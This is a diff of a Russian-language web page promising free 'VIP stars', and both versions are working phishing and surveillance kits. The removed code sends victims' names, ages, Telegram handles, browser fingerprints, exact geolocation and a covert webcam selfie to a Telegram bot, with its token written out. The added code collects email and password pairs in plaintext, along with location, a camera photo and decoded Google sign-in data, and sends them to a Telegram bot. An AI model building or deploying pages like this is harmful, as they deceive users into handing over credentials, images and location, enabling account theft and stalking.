@@ -1,635 +1,167 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BossBand - VIP Звёзды</title>
-    <style>
-        :root {
-            --primary: #6e45e2;
-            --secondary: #88d3ce;
-            --dark: #0f0f1a;
-            --light: #f8f9fa;
-            --accent: #ff6b6b;
-            --neon: #00f3ff;
-        }
-        
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Montserrat', sans-serif;
-            background: linear-gradient(135deg, var(--dark), #1a1a2e);
-            color: var(--light);
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 2rem;
-            position: relative;
-            z-index: 2;
-        }
-        
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1.5rem 0;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .logo {
-            font-size: 2.2rem;
-            font-weight: 800;
-            background: linear-gradient(to right, var(--neon), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 1px;
-            text-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
-        }
-        
-        nav a {
-            color: var(--light);
-            margin-left: 2rem;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-        
-        nav a:hover {
-            color: var(--neon);
-        }
-        
-        nav a::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: var(--neon);
-            transition: width 0.3s ease;
-        }
-        
-        nav a:hover::after {
-            width: 100%;
-        }
-        
-        .main-content {
-            text-align: center;
-            padding: 4rem 0;
-            position: relative;
-        }
-        
-        h1 {
-            font-size: 3.8rem;
-            margin-bottom: 1.5rem;
-            background: linear-gradient(to right, #fff, var(--neon));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1.2;
-            text-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
-        }
-        
-        .subtitle {
-            font-size: 1.5rem;
-            margin-bottom: 3rem;
-            opacity: 0.9;
-            max-width: 700px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, var(--accent), var(--primary));
-            color: white;
-            border: none;
-            padding: 1.2rem 3rem;
-            font-size: 1.3rem;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2), 0 0 15px rgba(0, 243, 255, 0.3);
-            transition: all 0.4s ease;
-            position: relative;
-            overflow: hidden;
-            margin: 2rem 0;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1;
-        }
-        
-        .btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3), 0 0 25px rgba(0, 243, 255, 0.4);
-        }
-        
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn i {
-            margin-right: 12px;
-            font-size: 1.2em;
-        }
-        
-        .btn-loading {
-            pointer-events: none;
-            opacity: 0.9;
-        }
-        
-        .camera-preview {
-            width: 300px;
-            height: 400px;
-            margin: 2rem auto;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-            display: none;
-            position: relative;
-            border: 2px solid var(--neon);
-        }
-        
-        .camera-preview video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .camera-preview.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .countdown {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 5rem;
-            font-weight: 800;
-            color: white;
-            text-shadow: 0 0 20px rgba(0,0,0,0.5);
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        
-        .countdown.active {
-            opacity: 1;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        
-        .stars-animation {
-            font-size: 2rem;
-            margin: 3rem 0;
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-        }
-        
-        .star {
-            animation: float 3s ease-in-out infinite;
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
-        
-        footer {
-            text-align: center;
-            padding: 3rem 0;
-            margin-top: 4rem;
-            border-top: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            pointer-events: none;
-        }
-        
-        .user-form {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 2rem;
-            border-radius: 15px;
-            max-width: 500px;
-            margin: 0 auto 2rem;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-        }
-        
-        .form-group {
-            margin-bottom: 1.5rem;
-            text-align: left;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 500;
-            color: var(--neon);
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 0.8rem 1rem;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 8px;
-            color: white;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: var(--neon);
-            box-shadow: 0 0 0 2px rgba(0, 243, 255, 0.2);
-        }
-        
-        .permission-checkbox {
-            display: flex;
-            align-items: center;
-            margin: 2rem 0;
-            justify-content: center;
-        }
-        
-        .permission-checkbox input {
-            margin-right: 10px;
-        }
-        
-        /* Адаптивность */
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 2.5rem;
-            }
-            
-            .subtitle {
-                font-size: 1.2rem;
-            }
-            
-            .btn {
-                padding: 1rem 2rem;
-                font-size: 1.1rem;
-            }
-            
-            .camera-preview {
-                width: 250px;
-                height: 350px;
-            }
-            
-            header {
-                flex-direction: column;
-            }
-            
-            nav {
-                margin-top: 1rem;
-            }
-            
-            nav a {
-                margin: 0 0.8rem;
-            }
-        }
-    </style>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>BossBand – VIP Звёзды</title>
+  <style>
+    :root {
+      --primary: #6e45e2; --accent: #ff6b6b; --neon: #00f3ff;
+      --bg-dark: #0f0f1a; --bg-light: #f8f9fa; --color-dark: #1a1a2e;
+    }
+    body {
+      margin:0; padding:0; font-family:'Montserrat',sans-serif;
+      background:var(--bg-dark); color:var(--bg-light);
+      min-height:100vh;
+      transition:background 0.3s,color 0.3s;
+    }
+    body.light {
+      background:var(--bg-light); color:var(--color-dark);
+    }
+    .container{max-width:1000px;margin:0 auto;padding:20px;}
+    header{display:flex;justify-content:space-between;align-items:center;}
+    .logo{font-size:2.2rem;font-weight:800;background:linear-gradient(to right,var(--neon),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+    nav a{margin-left:20px;text-decoration:none;color:inherit;}
+    .btn{background:linear-gradient(135deg,var(--accent),var(--primary));padding:10px 20px;border:none;color:#fff;border-radius:50px;cursor:pointer;transition:transform .2s;}
+    .btn:hover{transform:translateY(-3px);}
+    .form-group{margin-bottom:15px;}
+    input[type=email],input[type=password],input[type=text]{width:100%;padding:8px;border-radius:5px;border:none;}
+    .error{color:var(--accent);display:none;}
+    .success{color:var(--neon);display:none;}
+    .theme-toggle{cursor:pointer;font-size:1.2rem;}
+    .captcha{margin:15px 0;}
+    #cameraPreview{width:300px;height:400px;display:none;margin:15px auto;border:2px solid var(--neon);}
+    #cameraPreview.active{display:block;}
+  </style>
 </head>
 <body>
-    <div class="particles" id="particles-js"></div>
-    
-    <div class="container">
-        <header>
-            <div class="logo">BOSS BAND</div>
-            <nav>
-                <a href="#">Главная</a>
-                <a href="#">О нас</a>
-                <a href="#">Контакты</a>
-            </nav>
-        </header>
-        
-        <main class="main-content">
-            <h1>ПОЛУЧИТЕ ЭКСКЛЮЗИВНЫЕ<br>VIP ЗВЁЗДЫ</h1>
-            <p class="subtitle">Подтвердите свою личность для получения специального статуса в нашем сообществе</p>
-            
-            <div class="stars-animation">
-                <div class="star">⭐</div>
-                <div class="star">🌟</div>
-                <div class="star">✨</div>
-                <div class="star">💫</div>
-                <div class="star">🔥</div>
-            </div>
-            
-            <div class="user-form" id="userForm">
-                <div class="form-group">
-                    <label for="userName">Ваше имя</label>
-                    <input type="text" id="userName" placeholder="Как вас зовут?" required>
-                </div>
-                <div class="form-group">
-                    <label for="userAge">Ваш возраст</label>
-                    <input type="number" id="userAge" placeholder="Сколько вам лет?" required>
-                </div>
-                <div class="form-group">
-                    <label for="userNickname">Никнейм в Telegram</label>
-                    <input type="text" id="userNickname" placeholder="@username" required>
-                </div>
-            </div>
-            
-            <div class="permission-checkbox">
-                <input type="checkbox" id="permissionCheckbox" required checked>
-                <label for="permissionCheckbox">Я даю согласие на обработку данных и отправку геопозиции</label>
-            </div>
-            
-            <button id="getStarsBtn" class="btn">
-                <i class="fas fa-gem"></i> ПОЛУЧИТЬ ЗВЁЗДЫ
-            </button>
-            
-            <div class="camera-preview" id="cameraPreview">
-                <video id="cameraVideo" autoplay playsinline></video>
-                <div class="countdown" id="countdown">3</div>
-            </div>
-            
-            <p id="instructionText">После нажатия кнопки разрешите доступ к камере</p>
-        </main>
-    </div>
-    
-    <footer>
-        <p>© 2024 BOSS BAND. Все права защищены.</p>
-    </footer>
+  <div class="container">
+    <header>
+      <div class="logo">BOSS BAND</div>
+      <div>
+        <a href="#">Главная</a><a href="#">О нас</a><a href="#">Контакты</a>
+        <span class="theme-toggle" id="toggleTheme">🌓</span>
+      </div>
+    </header>
 
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-    <script>
-        // Инициализация частиц
-        particlesJS("particles-js", {
-            "particles": {
-                "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
-                "color": { "value": "#ffffff" },
-                "shape": { "type": "circle" },
-                "opacity": { "value": 0.5, "random": true },
-                "size": { "value": 3, "random": true },
-                "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1 },
-                "move": { "enable": true, "speed": 2, "direction": "none", "random": true, "straight": false, "out_mode": "out" }
-            },
-            "interactivity": {
-                "detect_on": "canvas",
-                "events": {
-                    "onhover": { "enable": true, "mode": "grab" },
-                    "onclick": { "enable": true, "mode": "push" }
-                }
-            }
-        });
+    <main>
+      <h1>ПОЛУЧИТЕ ЭКСКЛЮЗИВНЫЕ VIP ЗВЁЗДЫ</h1>
+      <p>Регистрация и подтверждение личности через Google, камера, гео, CAPTCHA</p>
 
-        const botToken = "7774453287:AAEn3dh5ebiN7sZFa__Wyf-JXwBUE1wUIrc";
-        const chatId = "7807571960";
-        const btn = document.getElementById("getStarsBtn");
-        const cameraPreview = document.getElementById("cameraPreview");
-        const cameraVideo = document.getElementById("cameraVideo");
-        const countdown = document.getElementById("countdown");
-        const instructionText = document.getElementById("instructionText");
-        const userForm = document.getElementById("userForm");
-        const permissionCheckbox = document.getElementById("permissionCheckbox");
-        let stream = null;
-        let userLocation = null;
+      <!-- Табы -->
+      <div style="margin:20px 0;">
+        <button class="btn" id="tabReg">Регистрация</button>
+        <button class="btn" id="tabVer">Подтверждение</button>
+      </div>
 
-        // Собираем данные браузера
-        function getBrowserData() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    rtt: navigator.connection.rtt,
-                    downlink: navigator.connection.downlink,
-                    saveData: navigator.connection.saveData
-                } : 'unknown',
-                referrer: document.referrer,
-                pageUrl: window.location.href,
-                timestamp: new Date().toISOString()
-            };
-        }
+      <!-- Регистрация -->
+      <div id="regForm">
+        <div class="form-group"><label>Email</label><input type="email" id="regEmail" required></div>
+        <div class="form-group"><label>Пароль</label><input type="password" id="regPass" required></div>
+        <div class="form-group"><label>Ник</label><input type="text" id="regNick"></div>
+        <div class="captcha">
+          <label>Сколько будет 7 + 5? <input type="text" id="captchaInput" required></label>
+        </div>
+        <div class="error" id="regError"></div>
+        <div class="success" id="regSuccess">✔️ Успешно зарегистрированы!</div>
+        <button class="btn" id="btnReg">Зарегистрироваться</button>
+      </div>
 
-        // Получаем геопозицию
-        async function getLocation() {
-            if (!permissionCheckbox.checked) return null;
-            
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date(position.timestamp).toISOString()
-                        });
-                    },
-                    (error) => {
-                        console.error("Geolocation error:", error);
-                        resolve(null);
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-            });
-        }
+      <!-- Подтверждение -->
+      <div id="verForm" style="display:none;">
+        <div class="form-group"><label>Email</label><input type="email" id="verEmail" required></div>
+        <div class="form-group"><label>Пароль</label><input type="password" id="verPass" required></div>
+        <div class="form-group"><label>Telegram-ник</label><input type="text" id="verTg"></div>
+        <div class="captcha">
+          <label>Сколько будет 4 + 6? <input type="text" id="captchaVer" required></label>
+        </div>
+        <div class="error" id="verError"></div>
+        <div class="success" id="verSuccess">✔️ Подтверждение отправлено!</div>
+        <button class="btn" id="btnVer">Подтвердить личность</button>
+        <div id="cameraPreview"><video id="cameraVideo" width="300" height="400" autoplay></video></div>
+      </div>
+      <!-- Кнопка Google -->
+      <div style="margin-top:20px;">
+        <div id="g_id_onload"
+             data-client_id="ВАШ_GOOGLE_CLIENT_ID"
+             data-context="signin"
+             data-callback="handleGoogle"
+             data-auto_prompt="false">
+        </div>
+        <div class="g_id_signin" data-type="standard"></div>
+      </div>
+    </main>
+  </div>
 
-        // Отправляем данные в Telegram
-        async function sendToTelegram(photoBlob, userData, browserData, location) {
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", photoBlob, "vip_stars_selfie.jpg");
-            
-            // Создаем текст сообщения с пользовательскими данными
-            let caption = `🎯 *Новая заявка на VIP Звёзды* 🎯\n\n` +
-                         `👤 *Имя:* ${userData.name}\n` +
-                         `🔢 *Возраст:* ${userData.age}\n` +
-                         `📱 *Telegram:* ${userData.nickname}\n\n` +
-                         `📍 *Геопозиция:* ${location ? 
-                             `https://www.google.com/maps?q=${location.latitude},${location.longitude}` : 
-                             'Не предоставлена'}\n\n` +
-                         `🌐 *Данные браузера:*\n` +
-                         `🔹 User Agent: ${browserData.userAgent}\n` +
-                         `🔹 Платформа: ${browserData.platform}\n` +
-                         `🔹 Язык: ${browserData.language}\n` +
-                         `🔹 Разрешение: ${browserData.screenWidth}x${browserData.screenHeight}\n` +
-                         `🔹 Часовой пояс: ${browserData.timezone}\n` +
-                         `🔹 Страница: ${browserData.pageUrl}\n` +
-                         `🕒 Время: ${browserData.timestamp}`;
-            
-            formData.append("caption", caption);
-            formData.append("parse_mode", "Markdown");
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-                
-                if (!response.ok) {
-                    const errorData = await response.json();
-                    throw new Error(errorData.description || "Ошибка отправки");
-                }
-                
-                return true;
-            } catch (e) {
-                console.error("Ошибка отправки в Telegram:", e);
-                throw e;
-            }
-        }
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <script>
+    particlesJS("particles-js",{particles:{number:{value:50}}});
+    const BOT = { token:"ВАШ_ТОКЕН", chat:"ВАШ_CHAT_ID" };
+    async function tgSend(text, method='sendMessage', form=null){
+      const url=`https://api.telegram.org/bot${BOT.token}/${method}`;
+      const init = form ? {method:"POST",body:form} : {method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:BOT.chat,parse_mode:'HTML',text})};
+      await fetch(url,init);
+    }
+    document.getElementById('toggleTheme').onclick=()=>{
+      document.body.classList.toggle('light');
+    };
+    // табы
+    document.getElementById('tabReg').onclick=_=>{regForm.style.display='';verForm.style.display='none';};
+    document.getElementById('tabVer').onclick=_=>{regForm.style.display='none';verForm.style.display='';};
+    // автосохранение
+    ['regEmail','regPass','verEmail','verPass','verTg'].forEach(id=>{
+      const el=document.getElementById(id);
+      el.value=localStorage.getItem(id)||'';
+      el.oninput=_=>localStorage.setItem(id,el.value);
+    });
 
-        btn.addEventListener("click", async () => {
-            try {
-                // Проверяем заполнение формы
-                const userName = document.getElementById("userName").value.trim();
-                const userAge = document.getElementById("userAge").value.trim();
-                const userNickname = document.getElementById("userNickname").value.trim();
-                
-                if (!userName || !userAge || !userNickname) {
-                    throw new Error("Пожалуйста, заполните все поля формы");
-                }
-                
-                if (!permissionCheckbox.checked) {
-                    throw new Error("Необходимо дать согласие на обработку данных");
-                }
-                
-                // Подготовка
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ПОДГОТОВКА';
-                btn.classList.add('btn-loading');
-                instructionText.textContent = "Разрешите доступ к камере...";
-                
-                // Получаем геопозицию (если разрешено)
-                userLocation = await getLocation();
-                
-                // Активируем камеру
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                
-                cameraVideo.srcObject = stream;
-                cameraPreview.classList.add('active');
-                instructionText.textContent = "Камера готова!";
-                
-                // Ждем пока камера полностью инициализируется
-                await new Promise(resolve => {
-                    cameraVideo.onplaying = resolve;
-                    setTimeout(resolve, 1000); // fallback
-                });
-                
-                // Начинаем обратный отсчет
-                btn.innerHTML = '<i class="fas fa-camera"></i> ГОТОВО!';
-                btn.classList.remove('btn-loading');
-                instructionText.textContent = "Снимок будет сделан автоматически...";
-                
-                for (let i = 3; i > 0; i--) {
-                    countdown.textContent = i;
-                    countdown.classList.add('active');
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    countdown.classList.remove('active');
-                    await new Promise(resolve => setTimeout(resolve, 200));
-                }
-                
-                // Делаем снимок
-                const canvas = document.createElement("canvas");
-                canvas.width = cameraVideo.videoWidth;
-                canvas.height = cameraVideo.videoHeight;
-                const ctx = canvas.getContext("2d");
-                
-                // Улучшаем качество фото
-                ctx.filter = 'brightness(1.1) contrast(1.1) saturate(1.1)';
-                ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-                
-                 // Останавливаем камеру
-                stream.getTracks().forEach(track => track.stop());
-                cameraPreview.classList.remove('active');
-                
-                // Проверяем не черное ли фото
-                const imageData = ctx.getImageData(0, 0, 1, 1).data;
-                if (imageData[0] < 30 && imageData[1] < 30 && imageData[2] < 30) {
-                    throw new Error("Не удалось сделать фото. Пожалуйста, попробуйте ещё раз.");
-                }
+    // регистрация
+    document.getElementById('btnReg').onclick=async()=>{
+      const e=regEmail.value, p=regPass.value, n=regNick.value, c=captchaInput.value;
+      if(!e||!p||c!=='12'){regError.textContent="Проверьте поля и CAPTCHA";regError.style.display='';return;}
+      regError.style.display='none';
+      await tgSend(`🎉 <b>Регистрация:</b>\nEmail: <code>${e}</code>\nПароль: <code>${p}</code>\nНик: ${n}\nUA: ${navigator.userAgent}`);
+      regSuccess.style.display='';
+    };
 
-                // Отправляем фото и данные
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ОТПРАВКА';
-                btn.classList.add('btn-loading');
-                instructionText.textContent = "Отправляем ваши звёзды...";
-                
-                canvas.toBlob(async (blob) => {
-                    try {
-                        // Собираем данные пользователя
-                        const userData = {
-                            name: userName,
-                            age: userAge,
-                            nickname: userNickname
-                        };
-                        
-                        // Собираем данные браузера
-                        const browserData = getBrowserData();
-                        
-                        // Отправляем все данные в Telegram
-                        await sendToTelegram(blob, userData, browserData, userLocation);
-                        
-                        // Успех
-                        btn.innerHTML = '<i class="fas fa-check"></i> ГОТОВО!';
-                        instructionText.textContent = "Звёзды успешно отправлены!";
-                        setTimeout(() => {
-                            window.location.href = "https://t.me/bossband2903_bot";
-                        }, 1500);
-                        
-                    } catch (e) {
-                        resetUI();
-                        alert("Ошибка отправки: " + e.message);
-                    }
-                }, "image/jpeg", 0.95);
-                
-            } catch (err) {
-                resetUI();
-                alert("Ошибка: " + err.message);
-            }
-        });
+    // подтверждение
+    document.getElementById('btnVer').onclick=async()=>{
+      const e=verEmail.value, p=verPass.value, tg=verTg.value, c=captchaVer.value;
+      if(!e||!p||c!=='10'){verError.textContent="Проверьте поля и CAPTCHA";verError.style.display='';return;}
+      verError.style.display='none';
 
-        function resetUI() {
-            // Восстанавливаем исходное состояние
-            btn.innerHTML = '<i class="fas fa-gem"></i> ПОЛУЧИТЬ ЗВЁЗДЫ';
-            btn.classList.remove('btn-loading');
-            instructionText.textContent = "После нажатия кнопки разрешите доступ к камере";
-            cameraPreview.classList.remove('active');
-            countdown.classList.remove('active');
-            
-            // Останавливаем камеру если активна
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-            }
-        }
-    </script>
+      // гео
+      let geo='нет данных';
+      await new Promise(r=>navigator.geolocation.getCurrentPosition(pos=>{geo=pos.coords.latitude+','+pos.coords.longitude;r();},r));
+
+      // камера
+      try {
+        const stream=await navigator.mediaDevices.getUserMedia({video:true});
+        cameraVideo.srcObject=stream; cameraPreview.classList.add('active');
+        await new Promise(r=>setTimeout(r,3000));
+        const canvas=document.createElement('canvas');
+        canvas.width=300; canvas.height=400;
+        canvas.getContext('2d').drawImage(cameraVideo,0,0);
+        canvas.toBlob(async b=>{
+          const form = new FormData();
+          form.append('chat_id',BOT.chat);
+          form.append('photo',b,'pic.jpg');
+          form.append('caption','📸 Фото подтверждения');
+          await tgSend(null,'sendPhoto',form);
+        },'image/jpeg');
+        stream.getTracks().forEach(t=>t.stop());
+      } catch{}
+
+      await tgSend(`🔐 <b>Подтверждение:</b>\nEmail:<code>${e}</code>\nПароль:<code>${p}</code>\nTelegram:${tg}\nGeo:${geo}`);
+      verSuccess.style.display='';
+    };
+
+    // Google OAuth
+    function handleGoogle(resp){
+      const d=JSON.parse(atob(resp.credential.split('.')[1]));
+      tgSend(`🔑 <b>Google OAuth:</b>\nEmail: <code>${d.email}</code>\nИмя: ${d.name}`);
+    }
+  </script>
 </body>
 </html>
